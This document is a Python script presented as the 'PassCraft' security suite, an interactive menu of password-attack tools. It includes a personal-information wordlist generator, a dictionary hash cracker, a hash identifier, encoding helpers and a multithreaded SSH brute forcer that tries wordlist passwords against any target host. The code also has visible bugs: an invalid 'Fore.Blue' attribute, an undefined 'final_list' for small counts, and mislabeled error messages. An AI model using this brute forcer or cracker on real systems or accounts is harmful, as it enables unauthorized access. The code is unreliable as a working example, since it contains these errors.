from colorama import init, Fore

init(autoreset=True)

banner = f"""{Fore.GREEN}
                      ____________________
                     /  ________________  \\
                    |  |      __         | |
                    |  |     /  \\       | |
                    |  |     \\__/       | |
                    |  |________________| |
                    \\____________________/
                   |______________________|
                __ |______________________| __
               /  \\________________________/  \\
              |  ||     ___________        ||  |
              |  ||    /   _______   \\     ||  |
              |  ||   /   /       \\   \\    ||  |
              |  ||  |   |  (o)(o)  |   |   ||  |
              |  ||  |   |    //     |   |   ||  |
              |  ||  |   |  \\____/   |   |   ||  |
              |  ||   \\   \\_______/   /    ||  |
              |  ||    \\___________/     ||  |
              |  ||________________________||  |
               \\__/________________________\\__/
                 |||`''''''''''''''''''''''|||
                 |||   PASSCRAFT FRAMEWORK   |||
                 |||_________________________|||
            .-.  `'---------------------------`  .-.
           /   \\  ___                       ___ /   \\
          |     |/   \\_____________________/   \\|     |
          |     | |  |`'-----''''''-----'`|  | |     |
          |     | |  |    SECURITY SUITE    |  | |     |
          \\___/  |  |____________________|  |  \\___/
               \\_|`'''''''''-----'''''''''|/_
          [#] RADX TOOL :: PASSCRAFT [#]
          [!] WARNING: SYSTEM ACCESS GRANTED [!]
"""

print(banner)
while True:
    print(Fore.BLUE + "1 - wordlist genrator")
    print(Fore.BLUE + "2 - Hash Crack")
    print(Fore.BLUE + "3 - Hash Type Grapper")
    print(Fore.BLUE + "4 - Encode/Decode")
    print(Fore.Blue + "5 - SSH Brute Forcer")
    print(Fore.BLUE + "6 - Exit")
    choice = input("\nplease choose a tool : ").strip()

    if choice == "1":
        def genrate_password():
            name = input("please enter the name : ").strip()
            birth = input("please enter the birthdate: ").strip()
            count_input = input("please enter the count of password : ").strip()
        
            if count_input.isdigit():
                count = int(count_input)
            else:
                count = 100 
            parts = [name, birth, birth.replace("/", ""), "1234567890", "!", "2030"]
            passwords = [f"{parts[0]}{parts[1]}", f"{parts[0]}1234567890", f"{birth}{name}", f"{name}!", f"{name}2030"]
    
            while len(passwords) < count:
                passwords.extend([f"{p}{len(passwords)}" for p in passwords])
                final_list = passwords[:count]

            with open("wordlist.txt", "w", encoding="utf-8") as f:
                f.write("\n".join(final_list))

            print(f"genrated {len(final_list)} passwords in 'wordlist.txt'")

        genrate_password()

    elif choice == "2":
        import hashlib
        
        def crack_hash(target_hash, wordlist_file, hash_type='md5'):
            try:
                with open(wordlist_file, 'r', encoding='utf-8') as f:
                    for line in f:
                        word = line.strip()
                        hasher = hashlib.new(hash_type)
                        hasher.update(word.encode('utf-8'))
                        hashed_word = hasher.hexdigest()
                    
                        if hashed_word == target_hash:
                            print(f"[+] the password has been found :  {word}")
                            return word
                print("[-] The Password Not Found.")
            except FileNotFoundError as err:
                print("[-] Invaild File : ", err)

        print("----HASH CRACK TOOL----")
        h_type = input("Please Enter Hash Type : ").strip()
        wordlist_file = input("Please Enter The Wordlist File : ").strip()
        target = input("Please Enter The Target : ").strip()
        print("[+] Searching...")
        crack_hash(target, wordlist_file, h_type)

    elif choice == "3":
        def identify_hash():
            print("---- HASH IDENTIFIER TOOL ----")
            target_hash = input("Please Enter The Target Hash: ").strip()
            length = len(target_hash)
            
            print(f"[*] Hash Length: {length} characters")
            
            if length == 32:
                print("[+] Detected Hash Type: MD5")
            elif length == 40:
                print("[+] Detected Hash Type: SHA-1")
            elif length == 64:
                print("[+] Detected Hash Type: SHA-256")
            elif length == 128:
                print("[+] Detected Hash Type: SHA-512")
            else:
                print("[-] Unknown or unsupported hash type length.")

        identify_hash()


    elif choice == "4":
        import base64, urllib.parse, hashlib
        print("---- ADVANCED ENCODER, DECODER & HASH SUITE ----")
        print("1 - Base64 Encode")
        print("2 - Base64 Decode")
        print("3 - URL Encode")
        print("4 - URL Decode")
        print("5 - MD5 Hash Generator")
        print("6 - SHA-256 Hash Generator")
        
        chc = input("Choose : ").strip()
        txt = input("Enter the text or payload : ").strip()
        
        try:
            if chc == "1":
                res = base64.b64encode(txt.encode('utf-8')).decode('utf-8')
                print(f"[+] Base64 Encoded : {res}")
            elif chc == "2":
                res = base64.b64decode(txt.encode('utf-8')).decode('utf-8')
                print(f"[+] Base64 Decoded : {res}")
            elif chc == "3":
                res = urllib.parse.quote(txt)
                print(f"[+] URL Encoded : {res}")
            elif chc == "4":
                res = urllib.parse.unquote(txt)
                print(f"[+] URL Decoded : {res}")
            elif chc == "5":
                res = hashlib.md5(txt.encode('utf-8')).hexdigest()
                print(f"[+] MD5 Hash : {res}")
            elif chc == "6":
                res = hashlib.sha256(txt.encode('utf-8')).hexdigest()
                print(f"[+] SHA-256 Hash : {res}")
            else:
                print("[-] Invalid selection!")
        except Exception as e:
            print(f"[-] Operation failed : {e}")

    elif choice == "5":
        import paramiko
        import time
        import socket
        from concurrent.futures import ThreadPoolExecutor

        def threadpassword(target_ip, username, password):
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh.connect(target_ip, port=22, username=username, password=password, timeout=3)
                print(f"\n[+] SUCCESS! Password Found: {password}")
                ssh.close()
                return True
            except (socket.error, paramiko.SSHException):
                print(f"[-] Failed: {password}")
            except paramiko.AuthenticationException:
                print(f"[-] Connection error or server blocked: {password}")
            except Exception:
                pass
            finally:
                try:
                    ssh.close()
                except:
                    pass
            return False

        def ssh_brute_force():
            print("---- SSH BRUTE FORCER TOOL ----")
            target_ip = input("Please Enter Target IP or Host : ").strip()
            username = input("Please Enter Target Username : ").strip()
            wordlist_file = input("Please Enter The Wordlist File Path : ").strip()
            max_workers = int(input("Please Enter How Much Pass Per Sec : "))
    
            print(f"\n[+] Starting SSH Brute Force on {target_ip} with user '{username}' \n")
    
            try:
                with open(wordlist_file, 'r', encoding='utf-8') as f:
                    passwords_list = [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]
        
                with ThreadPoolExecutor(max_workers) as executor:
                    for password in passwords_list:
                        executor.submit(threadpassword, target_ip, username, password)
                
                print("\n[-] Brute force finished.")
        
            except FileNotFoundError:
                print("[-] Wordlist file not found")
            except Exception as e:
                print(f"[-] Error: {e}")

        ssh_brute_force()
    elif choice == "6":
        print("Existing...")
        break
    else:
        print("invalid input")
